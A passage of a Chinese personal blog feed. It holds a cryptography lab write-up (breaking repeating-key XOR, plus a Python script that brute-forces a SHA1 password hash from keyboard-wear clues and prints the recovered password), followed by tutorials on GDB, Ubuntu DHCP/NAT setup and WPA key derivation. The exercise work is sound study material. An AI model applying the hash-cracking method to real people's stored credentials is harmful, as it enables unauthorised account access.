title="3.5使用“ICE”三个字母采用重复的密钥异或的方式加密两个字符串"></a>3.5使用“ICE”三个字母采用重复的密钥异或的方式加密两个字符串</h4><p>无非是密钥个数从一变为三了，取余3字节异或即可：</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br></pre></td><td class="code"><pre><code class="hljs python"><span class="hljs-keyword">import</span> binascii<br><br><span class="hljs-keyword">def</span> <span class="hljs-title function_">encodeRepeatingKeyXor</span>(<span class="hljs-params">s, key</span>):<br>    <span class="hljs-keyword">return</span> <span class="hljs-built_in">bytes</span>([s[i] ^ key[i % <span class="hljs-built_in">len</span>(key)] <span class="hljs-keyword">for</span> i <span class="hljs-keyword">in</span> <span class="hljs-built_in">range</span>(<span class="hljs-built_in">len</span>(s))])<br><br>x = <span class="hljs-string">b&#x27;&#x27;&#x27;Burning &#x27;em, if you ain&#x27;t quick and nimble</span><br><span class="hljs-string">I go crazy when I hear a cymbal&#x27;&#x27;&#x27;</span><br>key = <span class="hljs-string">b&#x27;ICE&#x27;</span><br><br><span class="hljs-keyword">if</span> __name__ == <span class="hljs-string">&#x27;__main__&#x27;</span>:<br>    y = encodeRepeatingKeyXor(x, key)<br>    encodedY = binascii.hexlify(y).decode(<span class="hljs-string">&#x27;ascii&#x27;</span>)<br>    <span class="hljs-built_in">print</span>(encodedY)<br></code></pre></td></tr></table></figure><p>结果如下：</p><p>0b3637272a2b2e63622c2e69692a23693a2a3c6324202d623d63343c2a26226324272765272a282b2f20430a652e2c652a3124333a653e2b2027630c692b20283165286326302e27282f</p><h4 id="3-6解密通过重复密钥异或加密后并且经过base64处理的数据"><a href="#3-6解密通过重复密钥异或加密后并且经过base64处理的数据" class="headerlink" title="3.6解密通过重复密钥异或加密后并且经过base64处理的数据"></a>3.6解密通过重复密钥异或加密后并且经过base64处理的数据</h4><p>步骤题目中已经给出，按照题目给的步骤一步一步来做即可<br>首先确定 KEYSIZE 也就是密钥长度，题目中说的是密钥长度在2-40之间，这里提一个汉明距离的概念，就是不同比特的数量。</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><code class="hljs python"><span class="hljs-keyword">def</span> <span class="hljs-title function_">getHammingDistance</span>(<span class="hljs-params">x, y</span>):<br>    <span class="hljs-keyword">return</span> <span class="hljs-built_in">sum</span>([<span class="hljs-built_in">bin</span>(x[i] ^ y[i]).count(<span class="hljs-string">&#x27;1&#x27;</span>) <span class="hljs-keyword">for</span> i <span class="hljs-keyword">in</span> <span class="hljs-built_in">range</span>(<span class="hljs-built_in">len</span>(x))])<br><br><span class="hljs-comment">#检测汉明距离计算函数是否正确</span><br>x = <span class="hljs-string">b&#x27;this is a test&#x27;</span><br>y = <span class="hljs-string">b&#x27;wokka wokka!!!&#x27;</span><br>expectedD = <span class="hljs-number">37</span><br>d = getHammingDistance(x, y)<br><span class="hljs-keyword">if</span> d != expectedD:<br>    <span class="hljs-keyword">raise</span> Exception(encodedD + <span class="hljs-string">&#x27; != &#x27;</span> + encodedExpectedD)<br></code></pre></td></tr></table></figure><p>先根据汉明距离，计算出汉明距离最小的keysize值</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><code class="hljs python"><span class="hljs-keyword">def</span> <span class="hljs-title function_">normalizedEditDistance</span>(<span class="hljs-params">x, k</span>):<br>    blocks = [x[i:i+k] <span class="hljs-keyword">for</span> i <span class="hljs-keyword">in</span> <span class="hljs-built_in">range</span>(<span class="hljs-number">0</span>, <span class="hljs-built_in">len</span>(x), k)][<span class="hljs-number">0</span>:<span class="hljs-number">4</span>]<br>    pairs = <span class="hljs-built_in">list</span>(itertools.combinations(blocks, <span class="hljs-number">2</span>))<br>    scores = [getHammingDistance(p[<span class="hljs-number">0</span>], p[<span class="hljs-number">1</span>])/<span class="hljs-built_in">float</span>(k) <span class="hljs-keyword">for</span> p <span class="hljs-keyword">in</span> pairs][<span class="hljs-number">0</span>:<span class="hljs-number">6</span>]<br>    <span class="hljs-keyword">return</span> <span class="hljs-built_in">sum</span>(scores) / <span class="hljs-built_in">len</span>(scores)<br><br>k = <span class="hljs-built_in">min</span>(<span class="hljs-built_in">range</span>(<span class="hljs-number">2</span>, <span class="hljs-number">41</span>), key=<span class="hljs-keyword">lambda</span> k: normalizedEditDistance(x, k))<br></code></pre></td></tr></table></figure><p>最终k值就是keysize<br>然后，取得keysize后，按照keysize对密文进行分块，然后对密文的每一个比特采用第三题的方法，猜出得分值最高的就是密钥，共需要keysize次循环即可找出相应的全部口令，函数如下：</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br></pre></td><td class="code"><pre><code class="hljs python"><span class="hljs-keyword">def</span> <span class="hljs-title function_">breakRepeatingKeyXor</span>(<span class="hljs-params">x, k</span>):<br>    blocks = [x[i:i+k] <span class="hljs-keyword">for</span> i <span class="hljs-keyword">in</span> <span class="hljs-built_in">range</span>(<span class="hljs-number">0</span>, <span class="hljs-built_in">len</span>(x), k)]<br>    transposedBlocks = <span class="hljs-built_in">list</span>(itertools.zip_longest(*blocks, fillvalue=<span class="hljs-number">0</span>))<br>    key = [challenge3.breakSingleByteXOR(<span class="hljs-built_in">bytes</span>(x))[<span class="hljs-number">0</span>] <span class="hljs-keyword">for</span> x <span class="hljs-keyword">in</span> transposedBlocks]<br>    <span class="hljs-keyword">return</span> <span class="hljs-built_in">bytes</span>(key)<br><br>key = breakRepeatingKeyXor(x, k)<br>y = challenge5.encodeRepeatingKeyXor(x, key)<br><span class="hljs-built_in">print</span>(key)<br><span class="hljs-comment">#write the result to file to look</span><br>result = y.decode()<br><span class="hljs-built_in">open</span>(<span class="hljs-string">&#x27;Dechallenge6.txt&#x27;</span>, <span class="hljs-string">&#x27;w&#x27;</span>).write(result)<br></code></pre></td></tr></table></figure><p>最后运行的结果为：<br>key &#x3D;  erminator X: Bring the noise<br>明文写入了文件，部分如下图：</p><p><img src="/images/crypto1-5.png"></p><h3 id="4-通过社会工程学，猜测用户口令，破解SHA1处理后的字符串"><a href="#4-通过社会工程学，猜测用户口令，破解SHA1处理后的字符串" class="headerlink" title="4.通过社会工程学，猜测用户口令，破解SHA1处理后的字符串"></a>4.通过社会工程学，猜测用户口令，破解SHA1处理后的字符串</h3><p>题目给了我们一个键盘使用痕迹和数据库存储的sha1值，我们需要猜测出明文：</p><p><img src="/images/crypto1-6.png"></p><p>我们根据键盘使用确定使用的字符，然后循环计算sha1值与题目给的sha1值比对即可：</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br></pre></td><td class="code"><pre><code class="hljs python"><span class="hljs-comment">#coding:utf-8</span><br><span class="hljs-keyword">import</span> re<br><span class="hljs-keyword">from</span> Crypto.Hash <span class="hljs-keyword">import</span> SHA<br><span class="hljs-keyword">import</span> hashlib<br><span class="hljs-keyword">import</span> itertools<br>hash1=<span class="hljs-string">&quot;67ae1a64661ac8b4494666f58c4822408dd0a3e4&quot;</span><br>str1=<span class="hljs-string">&quot;QqWw%58(=0Ii*+nN&quot;</span><br>str2=[[<span class="hljs-string">&#x27;Q&#x27;</span>, <span class="hljs-string">&#x27;q&#x27;</span>],[ <span class="hljs-string">&#x27;W&#x27;</span>, <span class="hljs-string">&#x27;w&#x27;</span>],[ <span class="hljs-string">&#x27;%&#x27;</span>, <span class="hljs-string">&#x27;5&#x27;</span>], [<span class="hljs-string">&#x27;8&#x27;</span>, <span class="hljs-string">&#x27;(&#x27;</span>],[ <span class="hljs-string">&#x27;=&#x27;</span>, <span class="hljs-string">&#x27;0&#x27;</span>], [<span class="hljs-string">&#x27;I&#x27;</span>, <span class="hljs-string">&#x27;i&#x27;</span>], [<span class="hljs-string">&#x27;*&#x27;</span>, <span class="hljs-string">&#x27;+&#x27;</span>], [<span class="hljs-string">&#x27;n&#x27;</span>, <span class="hljs-string">&#x27;N&#x27;</span>]]<br><span class="hljs-keyword">def</span> <span class="hljs-title function_">sha_encrypt</span>(<span class="hljs-params"><span class="hljs-built_in">str</span></span>):<br>    sha = hashlib.sha1(<span class="hljs-built_in">str</span>)<br>    encrypts = sha.hexdigest()<br>    <span class="hljs-keyword">return</span> encrypts<br>st3=<span class="hljs-string">&quot;0&quot;</span>*<span class="hljs-number">8</span><br>str4=<span class="hljs-string">&quot;&quot;</span><br>str3=<span class="hljs-built_in">list</span>(st3)<br><span class="hljs-keyword">for</span> a <span class="hljs-keyword">in</span> <span class="hljs-built_in">range</span>(<span class="hljs-number">0</span>,<span class="hljs-number">2</span>):<br>    str3[<span class="hljs-number">0</span>]=str2[<span class="hljs-number">0</span>][a]<br>    <span class="hljs-keyword">for</span> b <span class="hljs-keyword">in</span> <span class="hljs-built_in">range</span>(<span class="hljs-number">0</span>,<span class="hljs-number">2</span>):<br>        str3[<span class="hljs-number">1</span>]=str2[<span class="hljs-number">1</span>][b]<br>        <span class="hljs-keyword">for</span> c <span class="hljs-keyword">in</span> <span class="hljs-built_in">range</span>(<span class="hljs-number">0</span>,<span class="hljs-number">2</span>):<br>            str3[<span class="hljs-number">2</span>]=str2[<span class="hljs-number">2</span>][c]<br>            <span class="hljs-keyword">for</span> d <span class="hljs-keyword">in</span> <span class="hljs-built_in">range</span>(<span class="hljs-number">0</span>,<span class="hljs-number">2</span>):<br>                str3[<span class="hljs-number">3</span>] = str2[<span class="hljs-number">3</span>][d]<br>                <span class="hljs-keyword">for</span> e <span class="hljs-keyword">in</span> <span class="hljs-built_in">range</span>(<span class="hljs-number">0</span>,<span class="hljs-number">2</span>):<br>                    str3[<span class="hljs-number">4</span>] = str2[<span class="hljs-number">4</span>][e]<br>                    <span class="hljs-keyword">for</span> f <span class="hljs-keyword">in</span> <span class="hljs-built_in">range</span>(<span class="hljs-number">0</span>,<span class="hljs-number">2</span>):<br>                        str3[<span class="hljs-number">5</span>] = str2[<span class="hljs-number">5</span>][f]<br>                        <span class="hljs-keyword">for</span> g <span class="hljs-keyword">in</span> <span class="hljs-built_in">range</span>(<span class="hljs-number">0</span>,<span class="hljs-number">2</span>):<br>                            str3[<span class="hljs-number">6</span>] = str2[<span class="hljs-number">6</span>][g]<br>                            <span class="hljs-keyword">for</span> h <span class="hljs-keyword">in</span> <span class="hljs-built_in">range</span>(<span class="hljs-number">0</span>,<span class="hljs-number">2</span>):<br>                                str3[<span class="hljs-number">7</span>] = str2[<span class="hljs-number">7</span>][h]<br>                                newS=<span class="hljs-string">&quot;&quot;</span>.join(str3)<br>                                <span class="hljs-keyword">for</span> i <span class="hljs-keyword">in</span> itertools.permutations(newS, <span class="hljs-number">8</span>):<br>                                    str4 = sha_encrypt(<span class="hljs-string">&quot;&quot;</span>.join(i))<br>                                    <span class="hljs-keyword">if</span> str4==hash1:<br>                                        <span class="hljs-built_in">print</span> <span class="hljs-string">&quot;&quot;</span>.join(i)<br>                                        exit(<span class="hljs-number">0</span>)<br><br></code></pre></td></tr></table></figure><p>结果为：</p><p>(Q&#x3D;win*5</p><h2 id="总结"><a href="#总结" class="headerlink" title="总结"></a>总结</h2><p>通过本次实验，我学会了通过赋分的方式遍历出最有可能的密钥值，学会了如何破解类维吉尼亚密码，学会了通过结合社会工程学的方法破解出用户口令的方法。</p><p>本次实验刚开始还很没有头绪，只知道遍历密钥不知道还有赋分这种模式，也不知道这种模式如何使用，然后去GitHub上参考了一波大佬们写的代码，顿时茅塞顿开，GitHub真是个好地方。其余python有关的库的使用问题百度基本就可解决所有问题。</p><h2 id="参考文献"><a href="#参考文献" class="headerlink" title="参考文献"></a>参考文献</h2><p><a href="https://github.com/akalin/cryptopals-python3">https://github.com/akalin/cryptopals-python3</a><br><a href="https://blog.csdn.net/liuweiran900217/article/details/19933549">https://blog.csdn.net/liuweiran900217/article/details/19933549</a><br><a href="https://www.cnblogs.com/elpsycongroo/p/7669786.html">https://www.cnblogs.com/elpsycongroo/p/7669786.html</a></p>]]></content>
    
    
    
    <tags>
      
      <tag>密码学</tag>
      
    </tags>
    
  </entry>
  
  
  
  <entry>
    <title>调试工具GDB的使用</title>
    <link href="/blog/2019/08/31/%E8%B0%83%E8%AF%95%E5%B7%A5%E5%85%B7GDB%E7%9A%84%E4%BD%BF%E7%94%A8/"/>
    <url>/blog/2019/08/31/%E8%B0%83%E8%AF%95%E5%B7%A5%E5%85%B7GDB%E7%9A%84%E4%BD%BF%E7%94%A8/</url>
    
    <content type="html"><![CDATA[<p><strong>大三了，是时候定一下自己的方向了，还剩一年就要开始秋招了。准备向Linux内核和Linux嵌入式方向走，感觉未来物联网设备会走进千家万户，Linux嵌入式系统用途将会增加很多。既然选择了某个方向，有了目标之后就义无反顾的走下去吧！</strong></p><p><img src="/images/fj21.jpg"></p><span id="more"></span><h3 id="GDB使用实例"><a href="#GDB使用实例" class="headerlink" title="GDB使用实例"></a>GDB使用实例</h3><h4 id="1-进入gdb"><a href="#1-进入gdb" class="headerlink" title="1.进入gdb"></a>1.进入gdb</h4><p>使用gcc编译源文件时，加上-g选项，之后使用 gdb  +  编译之后的文件名即可进入(gdb)开头的命令行界面了。如下图：</p><p><img src="/images/gdb1.png"></p><h4 id="2-查看文件"><a href="#2-查看文件" class="headerlink" title="2.查看文件"></a>2.查看文件</h4><p>在gdb中键入 ‘l’(list)就可以查看载入文件，如下图所示：</p><p><img src="/images/gdb2.png"></p><p>注意：一般情况下源代码中的行号与用户书写的行号是一致的，但有时由于用户的某些编译选项会导致行号不一样的情况，因此，一定要查看在gdb中的行号。</p><h4 id="3-设置断点"><a href="#3-设置断点" class="headerlink" title="3.设置断点"></a>3.设置断点</h4><p>设置断点可以使程序到达一定的位置暂停它的运行，程序员在该位置可以方便地查看变量的值、堆栈等情况，从而找出代码的症结所在。</p><p>在gdb中设置断点非常简单，只需要在“b”后加入对应的行号即可。如下图：</p><p><img src="/images/gdb3.png"></p><h4 id="4-查看断点处的情况"><a href="#4-查看断点处的情况" class="headerlink" title="4.查看断点处的情况"></a>4.查看断点处的情况</h4><p>在设置完成断点之后，用户可以键入”info b“来查看断点设置情况，在gdb中可以设置多个断点。</p><p><img src="/images/gdb4.png"></p><h4 id="5-运行代码"><a href="#5-运行代码" class="headerlink" title="5.运行代码"></a>5.运行代码</h4><p>接下来就可以运行代码了，gdb默认从首行开始运行代码，可键入”r”(run)即可，在r后面加上行号即可从程序中指定行开始运行。</p><p><img src="/images/gdb5.png"></p><p>可以看到，程序运行到断点处就停止了。</p><h4 id="6-查看变量值"><a href="#6-查看变量值" class="headerlink" title="6.查看变量值"></a>6.查看变量值</h4><p>在程序停止运行之后，程序员需要查看断点处的相关变量值。在gdb中只需键入“p + 变量值”即可，如下图所示：</p><p><img src="/images/gdb6.png"></p><h4 id="7-观察变量"><a href="#7-观察变量" class="headerlink" title="7.观察变量"></a>7.观察变量</h4><p>在某一循环处，我们往往需要观察一个变量的变化情况，这时候就需要键入命令“watch”来观察变量的变化情况，如下图所示：</p><p><img src="/images/gdb7.png"></p><h4 id="8-单步运行"><a href="#8-单步运行" class="headerlink" title="8.单步运行"></a>8.单步运行</h4><p>单步运行是指一次只运行一条语句，这样可以方便的查看程序运行结果，在此处只需要键入“n”(next)即可。</p><h4 id="9-程序的继续运行"><a href="#9-程序的继续运行" class="headerlink" title="9.程序的继续运行"></a>9.程序的继续运行</h4><p>命令“c”(continue)可以使gdb继续运行以下程序，再次遇到断点停止。</p><h4 id="10-退出gdb"><a href="#10-退出gdb" class="headerlink" title="10.退出gdb"></a>10.退出gdb</h4><p>退出gdb只需使用指令“q”（quit）即可。</p><h3 id="设置-x2F-删除断点"><a href="#设置-x2F-删除断点" class="headerlink" title="设置&#x2F;删除断点"></a>设置&#x2F;删除断点</h3><table><thead><tr><th align="center">命令格式</th><th align="center">作用</th></tr></thead><tbody><tr><td align="center">break+设置断点的行号</td><td align="center">用于在程序中对应行设置断点</td></tr><tr><td align="center">tbreak+行号或者函数名</td><td align="center">设置临时断点，到达后被自动删除</td></tr><tr><td align="center">break+filename+行号</td><td align="center">用于在指定文件的对应行设置断点</td></tr><tr><td align="center">break+&lt;0x…&gt;</td><td align="center">用于在内存某一位置处暂停</td></tr><tr><td align="center">break+行号+if条件</td><td align="center">用于设置条件断点，在循环中使用非常方便</td></tr><tr><td align="center">info breakpoints&#x2F;watchpoints</td><td align="center">查看断点&#x2F;观察点的情况</td></tr><tr><td align="center">clear+要清除的断点的行号</td><td align="center">清除对应行的断点</td></tr><tr><td align="center">disable+断点编号</td><td align="center">让断点暂时失效，enable可以使之生效</td></tr><tr><td align="center">awatch&#x2F;watch+变量</td><td align="center">设置一个观察点，当变量被读出或者写入时暂停</td></tr><tr><td align="center">rwatch+变量</td><td align="center">设置一个观察点，当变量被程序读时，程序被暂停</td></tr></tbody></table><h3 id="数据相关命令"><a href="#数据相关命令" class="headerlink" title="数据相关命令"></a>数据相关命令</h3><table><thead><tr><th align="center">命令格式</th><th align="center">作用</th></tr></thead><tbody><tr><td align="center">display+表达式</td><td align="center">该命令用于显示表达式的值，使用了该命令之后，每当程序运行到断点后都会显示表达式值</td></tr><tr><td align="center">info display</td><td align="center">用于显示当前所有要显示值的表达式的有关情况</td></tr><tr><td align="center">delete +display编号</td><td align="center">删除一个要显示值的表达式</td></tr><tr><td align="center">disable&#x2F;enable + display编号</td><td align="center">使一个要显示的表达式暂时无效&#x2F;有效</td></tr><tr><td align="center">whatis+变量</td><td align="center">显示某个表达式数据类型</td></tr><tr><td align="center">print(p)+变量或表达式</td><td align="center">打印某个变量或者表达式的值</td></tr><tr><td align="center">set+变量&#x3D;变量值</td><td align="center">改变程序中一个变量的值</td></tr></tbody></table>]]></content>
    
    
    
    <tags>
      
      <tag>Linux</tag>
      
      <tag>GDB</tag>
      
    </tags>
    
  </entry>
  
  
  
  <entry>
    <title>Ubuntu DHCP服务以及NET网桥的配置</title>
    <link href="/blog/2019/03/30/Ubuntu-DHCP%E6%9C%8D%E5%8A%A1%E4%BB%A5%E5%8F%8ANET%E7%BD%91%E6%A1%A5%E7%9A%84%E9%85%8D%E7%BD%AE/"/>
    <url>/blog/2019/03/30/Ubuntu-DHCP%E6%9C%8D%E5%8A%A1%E4%BB%A5%E5%8F%8ANET%E7%BD%91%E6%A1%A5%E7%9A%84%E9%85%8D%E7%BD%AE/</url>
    
    <content type="html"><![CDATA[<p><strong>项目成功实现了允许多密钥同时接入AP，由于需要配置一下DHCP服务和网桥保证STA连接后可以正常使用，以便于后面进行权限的控制。</strong></p><p><img src="/images/fj20.jpg"></p><span id="more"></span><h2 id="准备工作"><a href="#准备工作" class="headerlink" title="准备工作"></a>准备工作</h2><ul><li>Ubuntu 14.04</li><li>hostapd</li><li>isc-dhcp-server</li></ul><p>安装isc-dhcp-server：<br> <code>sudo apt-get install isc-dhcp-server</code></p><h2 id="开始配置"><a href="#开始配置" class="headerlink" title="开始配置"></a>开始配置</h2><h3 id="创建软AP"><a href="#创建软AP" class="headerlink" title="创建软AP"></a>创建软AP</h3><p>进入hostapd目录，执行以下命令运行hostapd:<br><code>sudo ./hostapd hostapd.conf</code></p><p>如果开启的时候，提示interface wlan0 wasn’t start，是因为你的wlan设备没有打开的原因。无线设备一般有三种状态，使用中，软锁定和硬锁定。其中软锁定就是关闭但可被软件激活，硬锁定则不可以。 输入下面两句命令，先关闭wifi，再软锁定wlan，最后重新打开hostapd即可。</p><p><code>sudo nmcli nm wifi off</code>(ubuntu14里面使用)<br><code>sudo nmcli radio wifi off</code>(ubuntu18里面使用)</p><p><code>sudo rfkill unblock wlan</code></p><h3 id="开启DHCP服务"><a href="#开启DHCP服务" class="headerlink" title="开启DHCP服务"></a>开启DHCP服务</h3><p>我们需要配置&#x2F;etc&#x2F;dhcp&#x2F;dhcpd.conf文件，添加要分配的网段，指明分配的地址范围，默认网关和DNS服务器地址。在文件最后我们添加以下内容。注意要分配的网段不能和主机eth0所处的网段相同。（我的主机处在192.168.52.140，所以我下面挑的是192.168.0.2&#x2F;24这段地址。）</p><figure class="highlight nginx"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><code class="hljs nginx"><span class="hljs-attribute">subnet</span> <span class="hljs-number">192.168.0.0</span> netmask <span class="hljs-number">255.255.255.0</span><br>&#123;<br><span class="hljs-attribute">range</span> <span class="hljs-number">192.168.0.2</span> <span class="hljs-number">192.168.0.250</span>;<br><br><span class="hljs-attribute">option</span> domain-name-servers <span class="hljs-number">8.8.8.8</span>;<br><span class="hljs-attribute">option</span> routers <span class="hljs-number">192.168.0.1</span>;<br>&#125;<br></code></pre></td></tr></table></figure><p>然后我们配置无线接口wlan2所处的网段，注意要跟上面的配置一致：<br><code>sudo ifconfig wlan2 192.168.0.1 netmask 255.255.255.0</code></p><p>最后开启dhcp服务器即可:<br><code>sudo service isc-dhcp-server start</code></p><h3 id="开启NET"><a href="#开启NET" class="headerlink" title="开启NET"></a>开启NET</h3><p>SNAT，Source Network Address Translation<br>源地址转换，能够为内部客户端代理访问外部网络。目标地址和端口不变，源地址修改成对外可见的公网地址，端口随机生成，并将映射记录在NAT表中。当数据返回时，根据端口将目的地址修改成对应表项的IP地址和端口，这样可以解决多个设备共享一个公有IP上网的问题。</p><p>在这里，我们要用到的是SNAT，这可以借助iptables工具来实现。iptables能够帮助我们配置管理linux内部防火墙。我们首先打开转发功能，然后将192.168.52.140的地址修改为eth0的出口地址。然后还要改&#x2F;etc&#x2F;sysctl.conf<br>net.ipv4.ip_forward&#x3D;1这行的注释去掉</p><figure class="highlight apache"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><code class="hljs apache"><span class="hljs-attribute">sudo</span> sysctl net.ipv4.ip_forward=<span class="hljs-number">1</span><br><span class="hljs-attribute">sudo</span> iptables -t nat -A POSTROUTING -s <span class="hljs-number">192.168.0.2</span>/<span class="hljs-number">24</span> -o eth0 -j MASQUERADE<br></code></pre></td></tr></table></figure><p>到此就完成了DHCP与NET的配置。</p>]]></content>
    
    
    
    <tags>
      
      <tag>Linux</tag>
      
      <tag>DHCP</tag>
      
      <tag>hostapd</tag>
      
    </tags>
    
  </entry>
  
  
  
  <entry>
    <title>WPA四步握手中PMK以及PTK的派生</title>
    <link href="/blog/2019/03/21/WPA%E5%9B%9B%E6%AD%A5%E6%8F%A1%E6%89%8B%E4%B8%ADPMK%E4%BB%A5%E5%8F%8APTK%E7%9A%84%E6%B4%BE%E7%94%9F/"/>
    <url>/blog/2019/03/21/WPA%E5%9B%9B%E6%AD%A5%E6%8F%A1%E6%89%8B%E4%B8%ADPMK%E4%BB%A5%E5%8F%8APTK%E7%9A%84%E6%B4%BE%E7%94%9F/</url>
    
    <content type="html"><![CDATA[<p><strong>雨打梨花深闭门，忘了青春，误了青春</strong></p><p><img src="/images/fj19.jpg"></p><span id="more"></span><h2 id="hostapd中某些类型的参数输出格式"><a href="#hostapd中某些类型的参数输出格式" class="headerlink" title="hostapd中某些类型的参数输出格式"></a>hostapd中某些类型的参数输出格式</h2><p><strong>首先必须知道u8等数据类型的定义：</strong></p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><code class="hljs C"><span class="hljs-keyword">typedef</span> <span class="hljs-type">signed</span> <span class="hljs-type">char</span> s8;  <br><span class="hljs-keyword">typedef</span> <span class="hljs-type">unsigned</span> <span class="hljs-type">char</span> u8;  <br>  <br><span class="hljs-keyword">typedef</span> <span class="hljs-type">signed</span> <span class="hljs-type">short</span> s16;  <br><span class="hljs-keyword">typedef</span> <span class="hljs-type">unsigned</span> <span class="hljs-type">short</span> u16;  <br>  <br><span class="hljs-keyword">typedef</span> <span class="hljs-type">signed</span> <span class="hljs-type">int</span> s32;  <br><span class="hljs-keyword">typedef</span> <span class="hljs-type">unsigned</span> <span class="hljs-type">int</span> u32;  <br>  <br><span class="hljs-keyword">typedef</span> <span class="hljs-type">signed</span> <span class="hljs-type">long</span> <span class="hljs-type">long</span> s64;  <br><span class="hljs-keyword">typedef</span> <span class="hljs-type">unsigned</span> <span class="hljs-type">long</span> <span class="hljs-type">long</span> u64;  <br></code></pre></td></tr></table></figure><table><thead><tr><th align="center">数据类型</th><th align="center">打印格式</th></tr></thead><tbody><tr><td align="center">u8</td><td align="center">%d</td></tr><tr><td align="center">s8</td><td align="center">%d</td></tr><tr><td align="center">u16</td><td align="center">%d or %hu</td></tr><tr><td align="center">s16</td><td align="center">%d or %hd</td></tr><tr><td align="center">u32</td><td align="center">%u</td></tr><tr><td align="center">s32</td><td align="center">%d</td></tr><tr><td align="center">u64</td><td align="center">%llu</td></tr><tr><td align="center">s64</td><td align="center">%lld</td></tr><tr><td align="center">unsigned int</td><td align="center">%u</td></tr></tbody></table><h2 id="PMK的派生"><a href="#PMK的派生" class="headerlink" title="PMK的派生"></a>PMK的派生</h2><p>PMK获得</p><ol><li>WPA-PSK<br> PMK&#x3D;PSK&#x3D; pdkdf2_SHA1(passphrase,SSID,SSID lenth,4096)其中passphrase,SSID ,是身份验证前authenticator,和supplicant都应该知道的</li><li>802.1X+EAP中<br> PMK &#x3D;L(MSK, 0, 256)<br> MSK 需要通过802.1X交换获得</li></ol><p>  <img src="/images/8021X+EAP.jpg"></p><p>  其中EAP-Request&#x2F;Method 中Method 表示EAP认证的方式,如下:<br>    MD5 Challenge      EAP 中类似CHAP的认证方式<br>    GTC                原本打算与RSA SecurID之类的token card 一起使用<br>    EAP-TLS            以数字证书相互认证<br>    TTLS               隧道式TLS;以TLS加密保护较弱的身份验证方式<br>    PEAP               防护型EAP;以TLS加密保护较弱的EAP验证方式<br>    EAP-SIM            SIM卡方式进行身份验证<br>    MS-CHAP-V2<br>Method 之后如果认证成功,authenticator会发出EAP-Success表示授权使用连接端口<br>再接下来AP就可以立即使用EAPOL-Key消息将MSK发给supplicant,以后就和WPA-PSK一样用MSK最终导出PTK(MSK,PMK就是PTK的密钥生成密钥)</p><h2 id="PTK的派生"><a href="#PTK的派生" class="headerlink" title="PTK的派生"></a>PTK的派生</h2><h3 id="PTK的内容"><a href="#PTK的内容" class="headerlink" title="PTK的内容"></a>PTK的内容</h3><p>PTK包含3个部分，KCK（Key Confirmation Key），KEK（Key Encryption Key），TK（Temporal Key）。<br>PTK的总长度根据加密方式不同而不同。<br>当加密方式是TKIP时，PTK长512位，按顺序分别为KCK占128位，KEK占128位，TK占256位。<br>当加密方式是CCMP时，PTK长384位，按顺序分别为KCK占128位，KEK占128位，TK占128位。<br>KEK和KCK是给EAPOL-Key，也就是四次握手时，加密和完整性验证用的。TK用于后续的数据加密。<br>四次握手的报文都是基于EAPOL-Key的。EAPOL-Key的结构如下：</p><p><img src="/images/PTK1.png"></p><h3 id="PTK的生成"><a href="#PTK的生成" class="headerlink" title="PTK的生成"></a>PTK的生成</h3><p>生成PTK，需要5个必要元素，PMK，ANonce（Nonce 1），SNonce（Nonce 2），Authenticate MAC（MAC 1），Supplicant MAC（MAC 2）。如下图：<br><img src="/images/PTK2.png"></p><p>2个Nonce分别是Authenticator和Supplicant生成的随机数。<br>这张图里的输出包含4个部分，其实Data Encr和Data MIC合起来就是前面提到的TK。而EAPOL Encr&#x2F;MIC分别对应前面的KEK和KCK。</p>]]></content>
    
    
    
    <tags>
      
      <tag>hostapd</tag>
      
      <tag>802.11</tag>
      
      <tag>WPA</tag>
      
    </tags>
    
  </entry>
  
  
  
  <entry>
    <title>zsh的配置与使用以及grep的使用</title>
    <link href="/blog/2019/03/19/zsh%E7%9A%84%E9%85%8D%E7%BD%AE%E4%B8%8E%E4%BD%BF%E7%94%A8%E4%BB%A5%E5%8F%8Agrep%E7%9A%84%E4%BD%BF%E7%94%A8/"/>
